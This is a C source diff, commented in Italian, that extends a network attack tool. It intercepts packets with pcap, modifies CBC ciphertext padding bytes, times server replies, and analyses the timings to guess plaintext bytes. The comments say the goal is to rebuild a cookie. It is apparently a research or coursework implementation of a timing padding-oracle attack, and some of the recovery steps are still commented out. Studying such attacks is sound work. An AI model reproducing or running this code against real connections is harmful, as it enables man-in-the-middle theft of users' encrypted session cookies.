@@ -1,9 +1,11 @@
 #define _GNU_SOURCE
 #include "../include/utility.h"
 #include "../include/network.h"
+#include "../../stats/stats.h"
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
@@ -157,6 +159,7 @@ int main(int argc, char *argv[]) {
     perror("error in pcap handle setup ");
     exit(EXIT_FAILURE);
   }
+  init_python_environment();
 
   pthread_create(&attack_thread, NULL, do_attack_thread, NULL);
   setup_network_interception();
@@ -445,6 +448,7 @@ void modify_packet(bool first_modification){
       //printf("valore del penultimo byte: %02x, valore dell'ultimo byte: %02x \n", val_penultimate_byte, val_last_byte);
     }
   }else{
+    //il valore con cui fare lo xor deve essere ottenuto dall'analisi statistica fatta suil'attacco precedente 
     data_packet->data[5 + ((4-1) * 16 ) + 14] = 0x01; //non devo mettere 0x01 ma il valore che mi permette di ottenere 0x01 in chiaro come padding
     data_packet->data[5 + ((4-1) * 16 ) + 13] = single_byte; //modifico il penultimo byte
     single_byte = (single_byte + 1) % 0x100;
@@ -565,9 +569,19 @@ void *do_attack_thread(void *arg){
   struct timespec start, stop;
   char *server_interface = get_server_interface(ip_server, port_server);
   bool first_attack = true;
+  int n_attemps = 0;
+  struct first_attack_result *fa_result = calloc(1, sizeof(struct first_attack_result));
+  struct attack_result *a_result = calloc(1, sizeof(struct attack_result));
+
+  if (!fa_result || !a_result) {
+      perror("Errore di allocazione memoria per le matrici!");
+      exit(EXIT_FAILURE);
+  }
+  //mi servono le variabili per tenere traccia del numero di L a cui sono arrivato e del byte che sto modificando (variabile globale ma va trasformata in numero)
+
   printf("server interface: %s", server_interface);
 
-  while(1==1){
+  while(1){
     // In do_attack_thread:
     pthread_mutex_lock(&attack_thread_mutex);
     while(attack == false){
@@ -620,7 +634,63 @@ void *do_attack_thread(void *arg){
 
     printf("Reply delta time: %lu \n", delta);
 
-    //write result to csv file
+    //write the reply time inside the struct
+
+    //if n_attemps == L_SIZE * 256 * 256 && first_attack (in first attack) call analyze_double_bytes(struct first_attack *result) function
+      //then set n_attemps == 0 and first_attack = false
+    //n_attemps / 256 = L (column for meas matrix)
+    //n_attemps - 256 * L = byte (row for meas matrix)
+
+    int column, row;
+   
+    if(first_attack){
+      column = (int)(n_attemps / (256 * 256));
+      row = n_attemps - (256 * 256 * column);
+      fa_result->time_meas[row][column] = (int64_t)delta;
+      n_attemps++;
+
+      //if(n_attemps == (L_SIZE * 256 * 256)){
+      if(n_attemps == (L_SIZE * 256 * 256)){
+        n_attemps = 0;
+        first_attack = false;
+
+        int byte_guess = analyze_double_bytes(fa_result);
+        printf("sono dopo alla funzione analyze_double_byte! \n");
+        Byte guessed_penultimate = (byte_guess >> 8) & 0xFF;
+        Byte guessed_last = (byte_guess & 0xFF);
+        printf("penultimate byte: 0x%02x last byte: 0x%02x\n", guessed_penultimate, guessed_last);
+
+        int block_offset = 5 + ((4 - 1) * 16); 
+        
+        //passare come void *data il pacchetto originale in modo da poter effettuare l'operazione di ricostruzione del plaintext 
+        //attualmente original_packet_data è indefinito
+        /*
+        Byte original_c_penultimate = original_packet_data[block_offset + 14]; 
+        Byte original_c_last        = original_packet_data[block_offset + 15];
+        
+        Byte expected_padding = 0x01; 
+        
+        Byte plain_penultimate = expected_padding ^ guessed_penultimate ^ original_c_penultimate;
+        Byte plain_last        = expected_padding ^ guessed_last ^ original_c_last;
+        
+        printf("Plaintext Penultimo: 0x%02x (ASCII: %c)\n", plain_penultimate, plain_penultimate);
+        printf("Plaintext Ultimo:    0x%02x (ASCII: %c)\n", plain_last, plain_last); */
+      }
+      //call analyze_double_byte(struct first_attack *result)
+    }else if(first_attack == false){
+      column = (int)(n_attemps / 256);
+      row = n_attemps - (column * 256);
+      a_result->time_meas[row][column] = delta;
+      n_attemps++;
+      if(n_attemps == (L_SIZE * 256)){
+        n_attemps = 0;
+        //int res_byte = analyze_single_byte(a_result);
+        //calcolare il byte in chiaro
+        //aggiungere il byte in chiaro al cookie e tenerne traccia per la modifica successiva
+      }
+      
+    }
+
     attack = false;
   }
 
